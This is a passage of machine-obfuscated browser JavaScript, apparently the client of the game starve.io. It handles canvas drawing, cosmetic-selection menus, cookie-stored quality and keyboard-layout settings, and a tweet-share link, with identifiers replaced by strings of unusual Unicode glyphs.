					var ᐃⲆⲆ = -((Δⵠ - ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - ⵠⲆⲆΔ + 500) / ΔᐃᐃΔ.ᐃᐃΔΔⲆⲆᐃ);
					if (ᐃⲆⲆ === 0) this.ΔⲆᐃΔΔⵠΔ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠⲆᐃᐃⲆⵠΔ(Δⵠ, ᐃⲆⲆ, this.seed, ᐃᐃⵠᐃΔᐃⵠ, ᐃⵠᐃΔⵠ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ);
					Δ.globalAlpha = ⵠΔΔ;
					if (ⵠⵠΔᐃ === -ΔⵠΔⵠ) return;
					var ᐃⲆⲆ = -((ⵠⵠΔᐃ - ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - ⵠⲆⲆΔ + 698) / ΔᐃᐃΔ.ᐃΔⲆⵠⵠⵠⵠ);
					if (ᐃⲆⲆ <= .01) this.ᐃⵠᐃⵠⲆΔⵠ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠⲆᐃᐃⲆⵠΔ(ⵠⵠΔᐃ, ᐃⲆⲆ, this.ΔᐃⲆΔΔᐃⲆ, 6, 6, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ);
					Δ.globalAlpha = 1
				};
				this.w1 = {
					r: new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ᐃⲆΔΔⲆⲆⵠ, ⵠⲆᐃⵠ, ⲆⲆⲆΔᐃ, ΔᐃᐃΔ.ΔⲆⵠᐃᐃ, ΔᐃᐃΔ.ΔⲆⵠᐃᐃ, ΔᐃᐃΔ.ΔⲆⵠᐃⵠⲆⲆ),
					"ⲆⲆⵠΔ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ΔΔⲆΔΔⲆᐃ, 0, 10, ΔᐃᐃΔ.ΔⲆⵠᐃⵠⲆⲆ, ΔᐃᐃΔ.ΔⲆⵠᐃⵠⲆⲆ, ΔᐃᐃΔ.ΔⲆⵠᐃᐃ)
				};
				this.w2 = {
					r: new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ᐃᐃⲆᐃΔⲆᐃ, ᐃΔΔ, 10, ΔᐃᐃΔ.ᐃΔⲆⵠⲆᐃⵠ, ΔᐃᐃΔ.ᐃΔⲆⵠⲆᐃⵠ, ΔᐃᐃΔ.ᐃᐃΔΔⲆⲆᐃ),
					"ⲆⲆⵠΔ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⲆΔⵠⵠᐃ, 0, ⵠᐃⲆⲆΔ, ΔᐃᐃΔ.ᐃᐃΔΔⲆⲆᐃ, ΔᐃᐃΔ.ᐃᐃΔΔⲆⲆᐃ, ΔᐃᐃΔ.ᐃΔⲆⵠⲆᐃⵠ)
				};
				this.w3 = {
					r: new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.Ⲇᐃⵠᐃᐃᐃᐃ, Ⲇᐃⵠⵠ, 10, ΔᐃᐃΔ.Δᐃᐃᐃᐃᐃᐃ, ΔᐃᐃΔ.Δᐃᐃᐃᐃᐃᐃ, ΔᐃᐃΔ.ᐃΔⲆⵠⵠⵠⵠ),
					"ⲆⲆⵠΔ": new ΔΔⲆᐃ.ⵠΔⵠⲆⲆ(ΔΔⲆᐃ.ⲆΔⵠⵠᐃ, ⵠΔⲆⵠ, ΔᐃⲆⲆⵠ, ΔᐃᐃΔ.ᐃΔⲆⵠⵠⵠⵠ, ΔᐃᐃΔ.ᐃΔⲆⵠⵠⵠⵠ, ΔᐃᐃΔ.Δᐃᐃᐃᐃᐃᐃ)
				};
				this.ⵠⲆⵠⲆⲆⵠΔⵠⵠ = function(ⵠⲆΔΔΔ) {
					var ᐃⵠⵠ;
					if (ⵠⲆΔΔΔ.r.x === ⵠⲆΔΔΔ.r.ΔᐃΔⲆΔ) {
						ⵠⲆΔΔΔ.ⲆⲆⵠΔ.x === ⵠⲆΔΔΔ.ⲆⲆⵠΔ.ΔᐃΔⲆΔ ? ᐃⵠⵠ = ⵠⲆΔΔΔ.r : ᐃⵠⵠ = ⵠⲆΔΔΔ.ⲆⲆⵠΔ
					} else ᐃⵠⵠ = ⵠⲆΔΔΔ.r;
					return ᐃⵠⵠ
				};
				this.ΔᐃⲆ = function(ⵠⲆΔΔΔ) {
					var ᐃⵠⵠ;
					if (ⵠⲆΔΔΔ.r.x === ⵠⲆΔΔΔ.r.ΔᐃΔⲆΔ) {
						ⵠⲆΔΔΔ.ⲆⲆⵠΔ.x === ⵠⲆΔΔΔ.ⲆⲆⵠΔ.ΔᐃΔⲆΔ ? (ⵠⲆΔΔΔ.r.ᐃᐃᐃΔΔⲆᐃ(), ⵠⲆΔΔΔ.ⲆⲆⵠΔ.ᐃᐃᐃΔΔⲆᐃ(), ᐃⵠⵠ = ⵠⲆΔΔΔ.r) : ᐃⵠⵠ = ⵠⲆΔΔΔ.ⲆⲆⵠΔ
					} else ᐃⵠⵠ = ⵠⲆΔΔΔ.r;
					ᐃⵠⵠ.ⲆΔᐃⵠΔ(ᐃⵠⵠ.ΔᐃΔⲆΔ);
					return ᐃⵠⵠ
				};
				this.ⲆⲆⵠⵠⵠ = [];
				this.ⵠᐃᐃⲆⵠ = [];
				this.ΔⲆⲆΔΔΔᐃ = [];
				this.ᐃⲆⵠᐃᐃΔΔ = [];
				this.ⲆⲆⲆΔⵠ = function() {
					for (var ⵠᐃ = 0; ⵠᐃ < ᐃⵠⵠⲆⲆⲆΔ; ⵠᐃ++) {
						this.ⲆⲆⵠⵠⵠ[ⵠᐃ] = Math.floor(ⲆᐃⵠⲆⵠⵠⲆ[ⵠᐃ] * ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ);
						this.ⵠᐃᐃⲆⵠ[ⵠᐃ] = Math.floor(ΔᐃᐃΔ.ᐃΔᐃⵠΔⵠⲆ * ⲆᐃⵠⲆⵠⵠⲆ[ⵠᐃ]);
						this.ΔⲆⲆΔΔΔᐃ[ⵠᐃ] = Math.floor(ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ * ⲆᐃⵠⲆⵠⵠⲆ[ⵠᐃ]);
						this.ᐃⲆⵠᐃᐃΔΔ[ⵠᐃ] = Math.floor(ΔᐃᐃΔ.ᐃΔᐃⵠΔⵠⲆ * ⲆᐃⵠⲆⵠⵠⲆ[ⵠᐃ])
					}
					this.w1.r.x = this.w1.r.ΔᐃΔⲆΔ;
					this.w2.r.ⲆᐃⲆᐃᐃ = 3.5;
					this.w3.r.ⲆᐃⲆᐃᐃ = 2
				};
				this.ⲆⲆⲆΔⵠ()
			}
			this.ΔⵠⲆⵠ = [];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆⲆΔ; ⵠᐃ++) this.ΔⵠⲆⵠ.push(new ᐃΔᐃⲆΔⵠᐃᐃᐃ)
		}
		setTimeout(ⲆᐃΔⲆⵠΔᐃ, 1e5);

		function ⵠⵠⵠΔⲆⲆⵠⲆⵠ(ⲆᐃⲆⲆᐃΔᐃ, ΔⲆᐃⲆΔ) {
			const ΔΔΔⲆⵠΔⲆ = (8 << (ⲆᐃⲆⲆᐃΔᐃ >> 0 & 255)) + (0 << (ⲆᐃⲆⲆᐃΔᐃ >> 16 & 255)) + (16 << (ⲆᐃⲆⲆᐃΔᐃ >> 24 & 255)) + (24 << (ⲆᐃⲆⲆᐃΔᐃ >> 8 & 255));
			const ⵠⲆⵠⵠⲆⵠᐃ = (8 << (ΔⲆᐃⲆΔ >> 0 & 255)) + (24 << (ΔⲆᐃⲆΔ >> 16 & 255)) + (0 << (ΔⲆᐃⲆΔ >> 24 & 255)) + (16 << (ΔⲆᐃⲆΔ >> 8 & ᐃᐃⲆⵠⲆ));
			const ⲆᐃⵠⲆᐃᐃⲆ = ΔⲆΔΔⲆΔⵠ(ΔΔΔⲆⵠΔⲆ, ⵠⲆⵠⵠⲆⵠᐃ, ΔΔΔⲆⵠΔⲆ);
			const ᐃⵠᐃⲆⲆⲆΔᐃⲆ = ⲆⲆΔⵠⲆᐃΔΔᐃ(ⵠⲆⵠⵠⲆⵠᐃ, ΔΔΔⲆⵠΔⲆ, ⵠⲆⵠⵠⲆⵠᐃ, ΔΔΔⲆⵠΔⲆ, ⵠⲆⵠⵠⲆⵠᐃ);
			const ΔΔΔᐃⵠΔᐃΔⲆ = (2610 | ⲆᐃⵠⲆᐃᐃⲆ) & ~(2610 & ⲆᐃⵠⲆᐃᐃⲆ);
			return ΔΔΔᐃⵠΔᐃΔⲆ
		}
		var ⵠⲆⵠⲆⲆΔⲆ = "datas/info.json";
		if (ⵠᐃᐃᐃᐃᐃᐃ === ᐃᐃⲆⲆΔΔΔ.ⵠⵠⵠⲆⲆⲆᐃ) {
			ⵠⲆⵠⲆⲆΔⲆ = "datas/info.local.json"
		}
		var ⲆⲆⵠΔⲆᐃⲆⲆⲆ = {
			"ⵠⲆⵠⲆⲆΔⲆ": ⵠⲆⵠⲆⲆΔⲆ
		};

		function ᐃΔᐃΔΔⲆᐃΔΔ() {
			ΔΔⲆᐃ.ΔⵠⲆΔⲆΔΔ("https://twitter.com/intent/tweet?text=I%20survived%20" + ᐃᐃΔ.ᐃΔⲆ + "%20days%20with%20" + ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ᐃⵠᐃⵠⵠ + "%20points%20in%20http%3A%2F%2Fstarve.io%2F%20%23starve.io")
		}

		function ᐃⵠⲆΔⲆⵠⵠᐃΔ(Ⲇⵠ, Δ) {
			this.Ⲇⵠ = Ⲇⵠ;
			this.Δ = Δ;
			if (ᐃⲆᐃΔᐃⵠᐃ.navigator.userAgent.indexOf("Edge") > -ΔᐃⲆⵠ) {
				this.ᐃⵠⲆᐃᐃΔⵠ = "default";
				this.ᐃΔΔΔⵠⲆΔ = "pointer"
			} else {
				this.ᐃⵠⲆᐃᐃΔⵠ = "url('img/cursor0.png'), default";
				this.ᐃΔΔΔⵠⲆΔ = "url('img/cursor1.png'), pointer"
			}
			var ᐃᐃᐃ = this;
			this.waiting = ᐃⵠΔⵠⲆ;
			this.ΔᐃᐃΔⲆⵠⵠ = 0;
			this.ⵠⲆΔⲆΔⲆⵠ = -1;
			this.ⵠᐃΔⲆⵠᐃᐃ = {
				translate: {
					x: 0,
					y: 0
				},
				angle: ⵠᐃⲆᐃ,
				"ᐃⵠ": ⵠⲆ[Ⲇ.ⲆⵠᐃᐃⲆⵠⵠ],
				"ΔᐃΔⵠ": function() {
					this.angle += ᐃⵠᐃᐃ * 2;
					Δ.save();
					Δ.translate(this.translate.x + this.ᐃⵠ.width / 2, this.translate.y + this.ᐃⵠ.height / Ⲇᐃᐃⵠ);
					Δ.rotate(this.angle);
					ΔⲆΔⵠ(Δ, this.ᐃⵠ, -this.ᐃⵠ.width / Δᐃⵠⵠ, -this.ᐃⵠ.height / 2);
					Δ.restore()
				}
			};
			this.ⵠⲆᐃΔΔᐃᐃ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("langselect"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("langselect").style,
				translate: {
					y: ᐃΔΔ,
					x: 0
				},
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(this.translate.x) + ⵠ[39];
					this.style.top = Math.floor(this.translate.y) + ⵠ[39]
				}
			};
			this.ᐃᐃⵠⵠᐃ = 0;
			this.ⵠⲆΔᐃⵠⲆⲆ = -1;
			this.ⲆⵠΔΔⵠΔⲆ = ⲆΔΔΔⲆ;
			this.ⵠΔⵠᐃⵠⵠᐃ = "";
			this.ⵠⵠⲆᐃⲆΔⲆ = "";
			this.ⵠⵠⵠⲆⵠⵠⵠ = undefined;
			this.ᐃⵠΔⵠᐃ = ΔΔⵠ;
			this.ΔᐃⲆⲆⲆᐃᐃ = -ⵠΔᐃ;
			this.ΔᐃⲆᐃᐃⲆᐃ = undefined;
			this.ΔΔⵠΔⲆⵠᐃ = ᐃⵠΔ;
			this.ⵠⵠᐃⲆΔᐃΔ = ⲆΔⵠ;
			this.ΔᐃΔᐃⵠⵠⲆ = 0;
			this.ⲆᐃᐃⲆᐃ = 0;
			this.ᐃⵠⲆᐃΔⵠΔ = 0;
			this.time = 0;
			this.ᐃⵠᐃⵠⵠ = 0;
			this.ⵠⵠΔⲆᐃⲆⵠ = 0;
			this.ⵠᐃᐃⵠΔΔᐃ = ΔᐃΔΔ;
			this.ΔᐃⵠΔⵠΔⲆ = ΔᐃΔΔ;
			this.ⲆⵠΔⵠⲆᐃⵠ = ᐃⵠΔ;
			this.ⲆΔⲆΔⲆΔⲆ = [];
			this.ᐃⵠΔΔᐃ = -Ⲇᐃⵠ;
			this.ⵠⲆᐃΔΔⲆⲆ = -1;
			this.ⵠⵠᐃⵠΔⵠⵠ = -1;
			this.ΔΔⵠΔⲆⲆⵠ = ΔΔΔⲆΔ;
			this.ΔⲆΔᐃΔⵠⲆ = ᐃᐃⵠⵠΔ;
			this.ⲆⲆᐃΔΔᐃⵠ = -ΔⵠⲆΔ;
			this.ᐃΔΔⵠΔⵠⵠ = -1;
			this.ΔⲆⵠΔⲆⲆΔ = -1;
			this.ΔⵠⵠⲆⵠΔΔ = -1;
			this.ᐃΔⵠΔⲆᐃⵠ = undefined;
			this.ᐃᐃᐃⲆⵠΔΔ = ⲆⵠᐃⲆⲆ;
			this.ⵠΔΔΔⲆᐃⵠ = undefined;
			this.ᐃΔⵠᐃΔΔΔ = undefined;
			this.ΔᐃⲆᐃⵠⲆⲆ = undefined;
			this.ᐃΔᐃⵠⵠΔⵠ = undefined;
			this.ΔⵠⲆΔⲆⵠᐃ = ⲆⲆⲆⲆᐃ;
			this.ᐃⵠᐃΔⵠⲆΔ = undefined;
			this.ⲆΔᐃⲆⵠΔⵠ = ΔΔΔⲆΔ;
			this.ⵠⲆᐃⲆΔⵠᐃ = 3;
			this.ᐃΔⲆⲆ = 0;

			function ΔⲆⵠⵠⵠᐃⲆ(ⵠᐃΔⵠΔⵠᐃ, ΔⵠᐃΔᐃΔᐃ, ΔⵠⵠᐃⵠⲆΔᐃᐃ, ᐃΔΔΔΔⵠΔΔᐃ, ΔΔⵠⲆ) {
				var ᐃⲆᐃΔⲆⲆⲆ = this;
				var ⵠΔⲆΔⵠ = ΔⵠᐃΔᐃΔᐃ + 9;
				var ΔⲆΔᐃⵠ = Ⲇᐃⵠⵠ;
				var ΔΔⲆⵠΔΔⵠ = ᐃΔΔΔΔⵠΔΔᐃ;
				for (var ⵠᐃ = ΔⵠᐃΔᐃΔᐃ; ⵠΔⲆΔⵠ > ⵠᐃ; ⵠᐃ++) {
					ᐃᐃᐃ.buttons[ⵠᐃ].info.callback = ⵠΔᐃᐃΔᐃⵠΔΔ;
					ᐃᐃᐃ.buttons[ⵠᐃ].info.ⵠᐃⵠⲆΔᐃⲆᐃⲆ = ⵠᐃΔⵠΔⵠᐃ
				}

				function ⵠᐃⵠᐃⲆⲆᐃⵠᐃ() {
					if (ΔⲆΔᐃⵠ * ΔΔᐃΔ + 9 < ⵠᐃΔⵠΔⵠᐃ.length) ΔⲆΔᐃⵠ++;
					ᐃⲆᐃΔⲆⲆⲆ.ΔᐃΔᐃⲆ()
				}

				function ΔᐃΔᐃⲆ() {
					for (var ⵠᐃ = ΔⵠᐃΔᐃΔᐃ, ᐃⵠᐃⵠ = 3 * ΔⲆΔᐃⵠ; ⵠᐃ < ⵠΔⲆΔⵠ && ⵠᐃΔⵠΔⵠᐃ.length > ᐃⵠᐃⵠ; ⵠᐃ++, ᐃⵠᐃⵠ++) {
						if (ⵠᐃΔⵠΔⵠᐃ[ᐃⵠᐃⵠ].ⲆΔᐃ === ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ && ΔΔⵠⲆ[ᐃⵠᐃⵠ] === 0) {
							ᐃᐃᐃ.buttons[ⵠᐃ].info.ⲆⲆⵠⲆⵠⲆΔ = -ᐃᐃⵠ;
							ᐃᐃᐃ.buttons[ⵠᐃ].info.active = ⲆᐃⲆⲆ;
							continue
						}
						ᐃᐃᐃ.buttons[ⵠᐃ].info.ⲆⲆⵠⲆⵠⲆΔ = ᐃⵠᐃⵠ;
						for (var ⵠᐃⲆⲆ = 0; ⵠᐃⲆⲆ < ΔΔᐃΔ; ⵠᐃⲆⲆ++) {
							ᐃᐃᐃ.buttons[ⵠᐃ].info.ᐃⵠ[ⵠᐃⲆⲆ] = ⵠᐃᐃᐃⵠ[ⵠᐃΔⵠΔⵠᐃ[ᐃⵠᐃⵠ].ⲆΔᐃ][ⵠᐃⲆⲆ];
							ᐃᐃᐃ.buttons[ⵠᐃ].info.active = ⵠⵠᐃΔ;
							ᐃᐃᐃ.buttons[ⵠᐃ].info.ᐃⵠΔΔᐃᐃΔ = ΔΔⵠⲆ[ᐃⵠᐃⵠ]
						}
					}
					for (; ⵠᐃ < ⵠΔⲆΔⵠ; ⵠᐃ++) {
						ᐃᐃᐃ.buttons[ⵠᐃ].info.ⲆⲆⵠⲆⵠⲆΔ = -ᐃᐃⲆΔ;
						ᐃᐃᐃ.buttons[ⵠᐃ].info.active = ⲆᐃⲆⲆ
					}
					ⲆΔΔΔᐃᐃⵠ()
				}

				function ⲆΔΔΔᐃᐃⵠ() {
					var Ⲇⵠᐃ = ⵠᐃΔⵠΔⵠᐃ[ΔΔⲆⵠΔΔⵠ];
					ⵠⲆᐃΔ.ᐃΔⵠᐃΔΔΔ = ᐃⲆⲆⲆⲆ(Ⲇⵠᐃ.name, ⵠ[55], ⵠ[354], 30, 350, ⵠⵠⵠⲆⵠ, 10, ΔᐃΔⲆⲆ);
					if (Ⲇⵠᐃ.level !== ΔΔⵠᐃΔ) ⵠⲆᐃΔ.ΔᐃⲆᐃⵠⲆⲆ = ᐃⲆⲆⲆⲆ("Level " + Ⲇⵠᐃ.level, ⵠ[55], ⵠ[354], 30, 250, undefined, ΔᐃⲆⲆⵠ, 8);
					else ⵠⲆᐃΔ.ΔᐃⲆᐃⵠⲆⲆ = ᐃⲆⲆⲆⲆ("by " + Ⲇⵠᐃ.ᐃΔⵠ, ⵠ[55], ⵠ[354], 30, 250, ⲆⲆⲆⲆᐃ, ⲆⵠⲆᐃⲆ, 8)
				}

				function ⲆΔᐃⵠᐃⲆᐃⵠΔ() {
					ΔⲆΔᐃⵠ > 0 && ΔⲆΔᐃⵠ--;
					ᐃⲆᐃΔⲆⲆⲆ.ΔᐃΔᐃⲆ()
				}

				function ⵠΔᐃᐃΔᐃⵠΔΔ() {
					if (ΔΔⲆⵠΔΔⵠ === this.ⲆⲆⵠⲆⵠⲆΔ || this.ⲆⲆⵠⲆⵠⲆΔ === -ΔᐃⲆⵠ) return;
					if (this.ᐃⵠΔΔᐃᐃΔ > 0) {
						if (ΔⵠⲆⵠⲆⲆⲆ === ΔⵠᐃΔᐃΔᐃ) ⲆΔᐃⵠⵠ(ⵠⵠⵠⲆΔⵠⵠ, ⲆᐃⲆⲆ, ⵠ[465]);
						else ⲆΔᐃⵠⵠ(ⵠⵠᐃᐃⵠᐃⵠ, ⲆᐃⲆⲆ, ⵠ[465])
					} else {
						ΔⵠᐃΔᐃΔᐃ === ΔⵠⲆⵠⲆⲆⲆ ? ⲆΔᐃⵠⵠ(ⵠⵠⵠⲆΔⵠⵠ, ⵠⵠᐃΔ, ⵠ[35]) : ⲆΔᐃⵠⵠ(ⵠⵠᐃᐃⵠᐃⵠ, ⵠⵠᐃΔ, ⵠ[35])
					}
					ΔΔⲆⵠΔΔⵠ = this.ⲆⲆⵠⲆⵠⲆΔ;
					ΔⵠⵠᐃⵠⲆΔᐃᐃ(this.ⲆⲆⵠⲆⵠⲆΔ);
					ⲆΔΔΔᐃᐃⵠ()
				}
				this.ΔᐃΔᐃⲆ = ΔᐃΔᐃⲆ;
				ᐃᐃᐃ.buttons[ⵠΔⲆΔⵠ].info.callback = ⲆΔᐃⵠᐃⲆᐃⵠΔ;
				ᐃᐃᐃ.buttons[ⵠΔⲆΔⵠ + ΔᐃᐃⲆ].info.callback = ⵠᐃⵠᐃⲆⲆᐃⵠᐃ
			}
			this.ᐃᐃⵠⲆⵠⵠᐃⵠΔ = ᐃⲆᐃⵠΔ;
			this.ᐃⲆᐃΔⲆ = ΔΔᐃᐃ.get(ⵠ[63]) ? ΔΔᐃᐃ.get(ⵠ[63]) : "high";
			"high" === this.ᐃⲆᐃΔⲆ ? (document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[291]).style.backgroundColor = ⵠ[541], document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[213]).style.backgroundColor = ⵠ[329], this.ᐃⲆᐃΔⲆ = 1) : (document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[213]).style.backgroundColor = ⵠ[541], document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[291]).style.backgroundColor = ⵠ[329], this.ᐃⲆᐃΔⲆ = 0);
			this.ⵠⵠᐃᐃⲆⵠᐃΔΔ = function() {
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[291]).style.backgroundColor = ⵠ[541];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[213]).style.backgroundColor = ⵠ[329];
				ΔΔᐃᐃ.set(ⵠ[63], "high", {
					expires: 30
				});
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[246]).value = ᐃΔᐃⲆ;
				ΔⵠⵠⲆ.ᐃΔΔⲆᐃⵠᐃ();
				ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ = 1
			};
			this.ⵠΔᐃⲆΔⲆⵠⵠⲆ = function() {
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[291]).style.backgroundColor = ⵠ[329];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[213]).style.backgroundColor = ⵠ[541];
				ΔΔᐃᐃ.set(ⵠ[63], "low", {
					expires: 30
				});
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[246]).value = .5 / (devicePixelRatio / ⲆΔᐃΔΔᐃⲆ);
				ΔⵠⵠⲆ.ᐃΔΔⲆᐃⵠᐃ();
				ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ = Ⲇᐃⵠⵠ
			};
			if (ΔΔᐃᐃ.get(ⵠ[306]) === ⵠⵠⵠⲆⵠ && "FR" === ΔᐃⵠⲆΔ) {
				ΔⵠⵠΔΔ.ⵠⲆⲆⲆⲆᐃⵠ();
				this.mapping = "azerty"
			} else this.mapping = ΔΔᐃᐃ.get(ⵠ[306]) ? ΔΔᐃᐃ.get(ⵠ[306]) : "qwerty";
			"azerty" == this.mapping ? (ΔⵠⵠΔΔ.ⵠⲆⲆⲆⲆᐃⵠ(), document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[216]).style.backgroundColor = ⵠ[541], document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[151]).style.backgroundColor = ⵠ[329]) : (document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[151]).style.backgroundColor = ⵠ[541], document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[216]).style.backgroundColor = ⵠ[329]);
			this.ⵠⲆⲆⲆⲆᐃⵠ = function() {
				ΔⵠⵠΔΔ.ⵠⲆⲆⲆⲆᐃⵠ();
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[216]).style.backgroundColor = ⵠ[541];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[151]).style.backgroundColor = ⵠ[329];
				ΔΔᐃᐃ.set(ⵠ[306], "azerty", {
					expires: 30
				})
			};
			this.ⲆⵠᐃⲆᐃΔⵠ = function() {
				ΔⵠⵠΔΔ.ⲆⵠᐃⲆᐃΔⵠ();
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[216]).style.backgroundColor = ⵠ[329];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[151]).style.backgroundColor = ⵠ[541];
				ΔΔᐃᐃ.set(ⵠ[306], "qwerty", {
					expires: 30
				})
			};
			this.ⵠⵠⵠⲆⲆΔⲆ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("all_rights_reserved"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("all_rights_reserved").style,
				translate: {
					x: ΔⲆⲆ,
					y: 0
				},
				"ⵠⲆᐃ": function() {
					this.style.left = this.translate.x + ⵠ[39];
					this.style.top = Math.floor(this.translate.y) + ⵠ[39]
				}
			};

			function ⲆΔⲆΔⵠΔⲆ() {
				var ᐃΔΔΔⲆⲆΔ = Number(ΔΔᐃᐃ.get("starve_crate"));
				var ⲆᐃᐃⲆⲆⲆᐃ = Number(ΔΔᐃᐃ.get("starve_dead"));
				var ΔⵠᐃⲆⵠᐃΔ = Number(ΔΔᐃᐃ.get("starve_book"));
				var ΔᐃᐃⵠⲆⲆⵠ = Number(ΔΔᐃᐃ.get("starve_bag"));
				var ᐃΔΔⲆΔⲆΔ = Number(ΔΔᐃᐃ.get("starve_skin"));
				var ΔᐃⲆⵠⵠⲆᐃ = Number(ΔΔᐃᐃ.get("starve_accessory"));
				ᐃᐃᐃ.ⲆⵠⲆᐃ = ᐃΔΔⲆΔⲆΔ ? ᐃΔΔⲆΔⲆΔ : ΔΔⵠ;
				ᐃᐃᐃ.ⵠⲆᐃⵠⵠ = ΔⵠᐃⲆⵠᐃΔ ? ΔⵠᐃⲆⵠᐃΔ : 0;
				ᐃᐃᐃ.ⲆᐃⲆⲆᐃ = ᐃΔΔΔⲆⲆΔ ? ᐃΔΔΔⲆⲆΔ : ΔⵠⲆΔ;
				ᐃᐃᐃ.Δᐃᐃⵠᐃ = ΔᐃⲆⵠⵠⲆᐃ ? ΔᐃⲆⵠⵠⲆᐃ : 0;
				ᐃᐃᐃ.ΔⵠΔᐃⲆ = ΔᐃᐃⵠⲆⲆⵠ ? ΔᐃᐃⵠⲆⲆⵠ : ⵠᐃⲆᐃ;
				ᐃᐃᐃ.ᐃⲆⵠΔⵠ = ⲆᐃᐃⲆⲆⲆᐃ ? ⲆᐃᐃⲆⲆⲆᐃ : ⲆΔⵠ
			}
			ⲆΔⲆΔⵠΔⲆ();
			this.unlock = {};
			this.unlock.ⲆⵠⲆᐃ = [];
			this.unlock.ΔⵠΔᐃⲆ = [];
			this.unlock.ⵠⲆᐃⵠⵠ = [];
			this.unlock.ⲆᐃⲆⲆᐃ = [];
			this.unlock.ᐃⲆⵠΔⵠ = [];
			this.unlock.Δᐃᐃⵠᐃ = [];
			this.ⲆᐃⲆⲆⵠΔΔ = 0;

			function ᐃΔⲆΔⵠⲆⵠ() {
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ;
				for (var ⵠᐃ = 0; ⵠᐃ < ΔΔᐃⲆᐃ.length; ⵠᐃ++) {
					if (ΔΔᐃⲆᐃ[ⵠᐃ].ⲆΔᐃ === ⵠⵠⵠ.ⵠᐃⵠΔΔ) ᐃᐃᐃ.unlock.ⲆⵠⲆᐃ[ⵠᐃ] = ΔⵠⲆΔ;
					else ᐃᐃᐃ.unlock.ⲆⵠⲆᐃ[ⵠᐃ] = ᐃΔΔ
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ;
				for (var ⵠᐃ = 0; ⵠᐃ < ΔΔᐃⲆᐃ.length; ⵠᐃ++) {
					if (ΔΔᐃⲆᐃ[ⵠᐃ].ⲆΔᐃ === ⵠⵠⵠ.ⵠᐃⵠΔΔ) ᐃᐃᐃ.unlock.Δᐃᐃⵠᐃ[ⵠᐃ] = 1;
					else ᐃᐃᐃ.unlock.Δᐃᐃⵠᐃ[ⵠᐃ] = ⲆΔⵠ
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⵠᐃᐃⵠ;
				for (var ⵠᐃ = 0; ⵠᐃ < ΔΔᐃⲆᐃ.length; ⵠᐃ++) {
					if (ΔΔᐃⲆᐃ[ⵠᐃ].ⲆΔᐃ === ⵠⵠⵠ.ⵠᐃⵠΔΔ) ᐃᐃᐃ.unlock.ΔⵠΔᐃⲆ[ⵠᐃ] = ΔⵠⲆΔ;
					else ᐃᐃᐃ.unlock.ΔⵠΔᐃⲆ[ⵠᐃ] = ΔΔⵠⵠ
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ;
				for (var ⵠᐃ = Ⲇᐃᐃᐃ; ⵠᐃ < ΔΔᐃⲆᐃ.length; ⵠᐃ++) {
					ΔΔᐃⲆᐃ[ⵠᐃ].ⲆΔᐃ === ⵠⵠⵠ.ⵠᐃⵠΔΔ ? ᐃᐃᐃ.unlock.ⵠⲆᐃⵠⵠ[ⵠᐃ] = 1 : ᐃᐃᐃ.unlock.ⵠⲆᐃⵠⵠ[ⵠᐃ] = 0
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ;
				for (var ⵠᐃ = ΔⲆⲆ; ⵠᐃ < ΔΔᐃⲆᐃ.length; ⵠᐃ++) {
